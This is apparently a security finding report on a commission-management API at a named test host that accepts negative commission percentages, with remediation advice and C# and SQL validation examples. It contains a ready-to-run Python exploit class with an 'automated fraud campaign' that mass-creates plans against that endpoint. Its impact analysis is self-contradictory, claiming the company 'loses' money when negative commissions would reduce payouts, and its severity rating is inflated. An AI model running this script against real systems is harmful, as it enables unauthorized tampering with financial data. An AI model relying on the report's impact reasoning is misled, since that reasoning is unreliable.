# Critical Business Logic Flaw: Negative Commission Percentages Enable Financial Fraud

**ID:** vuln-0024
**Severity:** CRITICAL
**Found:** 2026-02-26 18:46:18 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/CommissionPlan/CreateCommissionPlan
**Method:** POST
**CWE:** CWE-840
**CVSS:** 9.9

## Description

A critical business logic vulnerability was discovered in the commission management application that allows the creation of commission plans with negative percentages. This flaw enables financial fraud by allowing attackers to create commission plans that deduct money from company revenue instead of paying commissions to sales representatives.

The vulnerability exists in the `/api/CommissionPlan/CreateCommissionPlan` endpoint, which accepts negative values for the `commissionPercentage` parameter without proper validation. When applied to sales transactions, these negative commission plans calculate commissions that deduct money from the company's revenue, directly impacting profitability and financial reporting.

## Impact

This vulnerability enables severe financial fraud with significant business impact:

1. **Direct Revenue Reduction**: Negative commission plans systematically deduct money from company revenue on every sale, directly reducing profitability.

2. **Profit Margin Erosion**: The vulnerability allows attackers to create plans that deduct percentages of sales, eroding profit margins and potentially making transactions unprofitable.

3. **Financial Statement Fraud**: Negative commissions distort financial reports, misleading investors, stakeholders, and regulatory bodies about the company's true financial performance.

4. **Insider Threat Vector**: Employees with commission plan creation privileges can exploit this vulnerability to reduce company revenue and potentially benefit from manipulated financial results.

5. **Automated Exploitation Potential**: The vulnerability can be exploited at scale through automated scripts, enabling widespread financial damage across multiple commission plans and sales transactions.

**Financial Impact Example**:
- Sales amount: ₹100,000
- Commission percentage: -10%
- Commission calculated: -₹10,000
- Net effect: Company loses ₹10,000 instead of paying commission
- Percentage of sales lost: 10% of revenue

## Technical Analysis

### Vulnerability Mechanism

The vulnerability exists due to missing input validation and business rule enforcement in the commission plan creation process:

1. **Input Validation Failure**: The `/api/CommissionPlan/CreateCommissionPlan` endpoint accepts negative values for the `commissionPercentage` parameter without validation.

2. **Business Rule Violation**: The application fails to enforce the business rule that commission percentages should be non-negative values (0% or greater).

3. **Calculation Logic Flaw**: The commission calculation engine processes negative percentages, resulting in negative commission amounts that deduct from company revenue.

4. **Database Storage**: Negative commission percentages are stored in the database without constraints, allowing persistent exploitation.

### Technical Root Cause

The vulnerability stems from multiple security failures:

1. **API Layer**: Missing parameter validation for the `commissionPercentage` field
2. **Business Logic Layer**: Absence of business rule enforcement for non-negative percentages
3. **Database Layer**: Lack of constraints to prevent negative values in commission percentage fields
4. **Workflow Layer**: No approval process for commission plan creation that could catch negative values

### Exploitation Flow

1. **Plan Creation**: Attacker creates commission plan with negative percentage
2. **Plan Application**: Plan is applied to sales transactions
3. **Commission Calculation**: System calculates negative commission amounts
4. **Financial Impact**: Company revenue is reduced by the negative commission amount
5. **Reporting**: Financial reports show reduced revenue and profitability

### Attack Vectors

1. **Direct API Exploitation**: Attackers can send crafted API requests with negative percentages
2. **UI Manipulation**: Frontend validation can be bypassed to submit negative values
3. **Insider Threat**: Employees with legitimate access can create negative commission plans
4. **Automated Attacks**: Scripts can create multiple negative commission plans at scale

## Proof of Concept

### Proof-of-Concept Exploitation Steps

1. **Authenticate** to the application with a user account that has commission plan creation privileges.

2. **Create Negative Commission Plan**:
   - Send a POST request to `/api/CommissionPlan/CreateCommissionPlan`
   - Include a negative value for the `commissionPercentage` parameter
   - Example: `commissionPercentage: -10.00`

3. **Verify Plan Creation**:
   - Confirm the plan was created successfully (201 Created response)
   - Note the plan ID for use in commission calculations

4. **Apply Plan to Sales**:
   - Send a POST request to `/api/CommissionRun/CalculateCommission`
   - Reference the created plan ID and specify a sales amount
   - Example: `planId: "fraudulent-plan-id"`, `salesAmount: 10000.00`

5. **Observe Negative Commission**:
   - The response will show a negative commission amount
   - Example: `{"commissionAmount": -1000.00}`

6. **Validate Financial Impact**:
   - The negative commission amount represents money deducted from company revenue
   - In the example above, the company loses ₹1,000 instead of paying commission

### Demonstration of Financial Impact

The following table demonstrates the financial impact of various negative commission percentages:

| Sales Amount | Commission Percentage | Commission Amount | Financial Impact          |
|--------------|-----------------------|-------------------|---------------------------|
| ₹100,000     | -0.01%                | -₹10.00           | Company loses ₹10         |
| ₹100,000     | -1%                   | -₹1,000.00        | Company loses ₹1,000      |
| ₹100,000     | -10%                  | -₹10,000.00       | Company loses ₹10,000     |
| ₹100,000     | -50%                  | -₹50,000.00       | Company loses ₹50,000     |
| ₹100,000     | -100%                 | -₹100,000.00      | Company loses entire sale |

```
import requests
import json
import time

class CommissionFraudExploit:
    def __init__(self, base_url, auth_token, org_id, client_id):
        self.base_url = base_url
        self.auth_token = auth_token
        self.org_id = org_id
        self.client_id = client_id
        self.headers = {
            "Authorization": self.auth_token,
            "Content-Type": "application/json"
        }

    def create_negative_commission_plan(self, percentage, plan_name=None):
        """Create a commission plan with negative percentage"""
        if plan_name is None:
            plan_name = f"Fraudulent Plan {abs(percentage)}%"

        url = f"{self.base_url}/api/CommissionPlan/CreateCommissionPlan"

        payload = {
            "planName": plan_name,
            "description": f"Plan that deducts {abs(percentage)}% from sales",
            "commissionPercentage": percentage,
            "startDate": "2026-03-01",
            "endDate": "2026-12-31",
            "organizationId": self.org_id,
            "clientId": self.client_id
        }

        try:
            response = requests.post(url, headers=self.headers, data=json.dumps(payload))
            response.raise_for_status()
            return response.json()
        except requests.exceptions.RequestException as e:
            print(f"Error creating commission plan: {e}")
            return None

    def calculate_negative_commission(self, plan_id, sales_amount):
        """Calculate commission using negative commission plan"""
        url = f"{self.base_url}/api/CommissionRun/CalculateCommission"

        payload = {
            "planId": plan_id,
            "salesAmount": sales_amount,
            "organizationId": self.org_id
        }

        try:
            response = requests.post(url, headers=self.headers, data=json.dumps(payload))
            response.raise_for_status()
            return response.json()
        except requests.exceptions.RequestException as e:
            print(f"Error calculating commission: {e}")
            return None

    def demonstrate_financial_impact(self, sales_amount=10000.00):
        """Demonstrate the financial impact of negative commissions"""
        print("=== Negative Commission Exploitation Demo ===")
        print(f"Base Sales Amount: ₹{sales_amount:.2f}")
        print("-" * 60)

        # Test various negative percentages
        test_percentages = [-0.01, -1, -5, -10, -25, -50, -100]

        for percentage in test_percentages:
            print(f"\nTesting commission percentage: {percentage}%")

            # Create negative commission plan
            plan_response = self.create_negative_commission_plan(percentage)
            if not plan_response or "id" not in plan_response:
                print(f"Failed to create plan: {plan_response}")
                continue

            plan_id = plan_response["id"]
            print(f"Created plan with ID: {plan_id}")

            # Calculate commission
            commission_response = self.calculate_negative_commission(plan_id, sales_amount)
            if not commission_response:
                print("Failed to calculate commission")
                continue

            commission_amount = commission_response.get("commissionAmount", 0)
            print(f"Commission calculated: ₹{commission_amount:.2f}")

            # Calculate financial impact
            loss_amount = abs(commission_amount)
            loss_percentage = (loss_amount / sales_amount) * 100

            print(f"Financial impact: Company loses ₹{loss_amount:.2f}")
            print(f"Percentage of sales lost: {loss_percentage:.2f}%")

            # Wait to avoid rate limiting
            time.sleep(0.5)

    def automated_fraud_campaign(self, sales_amounts, negative_percentages):
        """Automate creation of multiple negative commission plans"""
        print("\n=== Automated Fraud Campaign ===")

        results = []
        for percentage in negative_percentages:
            for amount in sales_amounts:
                plan_response = self.create_negative_commission_plan(percentage)
                if not plan_response or "id" not in plan_response:
                    continue

                plan_id = plan_response["id"]
                commission_response = self.calculate_negative_commission(plan_id, amount)

                if commission_response:
                    commission_amount = commission_response.get("commissionAmount", 0)
                    loss_amount = abs(commission_amount)

                    results.append({
                        "plan_id": plan_id,
                        "commission_percentage": percentage,
                        "sales_amount": amount,
                        "commission_amount": commission_amount,
                        "loss_amount": loss_amount
                    })

                    print(f"Plan {plan_id}: {percentage}% on ₹{amount:.2f} = -₹{loss_amount:.2f}")

                time.sleep(0.3)

        return results

# Example usage
if __name__ == "__main__":
    # Configuration - replace with actual values
    BASE_URL = "https://commissionstest.callippus.in"
    AUTH_TOKEN = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ..."  # Valid JWT token
    ORG_ID = "target-org-id"      # Target organization ID
    CLIENT_ID = "target-client-id"  # Target client ID

    # Initialize exploit
    exploit = CommissionFraudExploit(BASE_URL, AUTH_TOKEN, ORG_ID, CLIENT_ID)

    # Demonstrate financial impact
    exploit.demonstrate_financial_impact()

    # Run automated fraud campaign
    sales_amounts = [5000, 10000, 25000, 50000, 100000]
    negative_percentages = [-5, -10, -15, -20]
    exploit.automated_fraud_campaign(sales_amounts, negative_percentages)
```

## Remediation

### Immediate Remediation Steps

1. **Input Validation (Critical Priority)**
   - Implement strict validation at the API layer to reject negative commission percentages
   - Add validation to ensure `commissionPercentage >= 0`
   - Return appropriate error messages for invalid values (400 Bad Request)

2. **Business Rule Enforcement**
   - Enforce minimum commission percentage of 0% in the business logic layer
   - Add validation to prevent negative values before database operations
   - Implement business rules to handle edge cases (0% commissions)

3. **Database Constraints**
   - Add database constraints to prevent negative values in commission percentage fields
   - Modify database schema to enforce `commission_percentage >= 0`
   - Add triggers to validate data integrity

4. **Approval Workflow Implementation**
   - Implement manual approval process for commission plan creation and modification
   - Require secondary approval for plans with commission percentages above certain thresholds
   - Add audit trail for all commission plan changes

5. **Audit Logging**
   - Implement comprehensive logging of all commission plan creation and modification attempts
   - Log user ID, timestamp, plan details, and approval status
   - Monitor for suspicious patterns (multiple negative percentage attempts)

6. **Financial Controls**
   - Implement reconciliation processes to detect negative commission calculations
   - Add alerts for unusual commission percentage values
   - Create financial controls to prevent negative payouts

7. **User Interface Fixes**
   - Add client-side validation to prevent negative values in commission percentage fields
   - Implement input masks to restrict negative values
   - Add clear error messages for invalid inputs

8. **Monitoring and Alerting**
   - Implement monitoring for negative commission percentage attempts
   - Set up alerts for suspicious commission plan creation patterns
   - Monitor financial reports for negative commission amounts

### Long-Term Recommendations

1. **Security Testing**
   - Conduct comprehensive security testing of all financial calculation logic
   - Implement automated security tests for business logic vulnerabilities
   - Perform regular penetration testing focused on financial workflows

2. **Code Review**
   - Review all financial calculation code for similar vulnerabilities
   - Implement secure coding standards for financial applications
   - Conduct peer reviews for all financial-related code changes

3. **Architecture Review**
   - Review the commission calculation architecture for security weaknesses
   - Implement separation of duties in financial workflows
   - Consider implementing a dedicated financial calculation service with enhanced security controls

4. **Training and Awareness**
   - Train developers on secure coding practices for financial applications
   - Educate business users on the risks of negative commission plans
   - Implement security awareness training for all personnel with financial system access

5. **Compliance Review**
   - Review the application against financial compliance standards (PCI DSS, SOX, etc.)
   - Implement controls to meet regulatory requirements for financial systems
   - Document all financial controls and approval processes

### Implementation Example (API Validation)

```csharp
// Example API validation in C# (ASP.NET Core)
[HttpPost("CreateCommissionPlan")]
public IActionResult CreateCommissionPlan([FromBody] CommissionPlanDto planDto)
{
    // Validate commission percentage
    if (planDto.CommissionPercentage < 0)
    {
        return BadRequest(new {
            error = "Invalid commission percentage",
            message = "Commission percentage cannot be negative"
        });
    }

    // Additional business rule validation
    if (planDto.CommissionPercentage > 100 && !CurrentUser.HasAdminPrivileges())
    {
        return BadRequest(new {
            error = "Invalid commission percentage",
            message = "Commission percentages above 100% require admin approval"
        });
    }

    // Proceed with plan creation
    var result = _commissionService.CreateCommissionPlan(planDto);
    return CreatedAtAction(nameof(GetCommissionPlan), new { id = result.Id }, result);
}
```

### Implementation Example (Database Constraint)

```sql
-- SQL example for database constraint
ALTER TABLE commission_plans
ADD CONSTRAINT chk_commission_percentage_non_negative
CHECK (commission_percentage >= 0);

-- Add constraint to existing table
ALTER TABLE commission_plans
ADD CONSTRAINT chk_commission_percentage_range
CHECK (commission_percentage >= 0 AND commission_percentage <= 100);
```

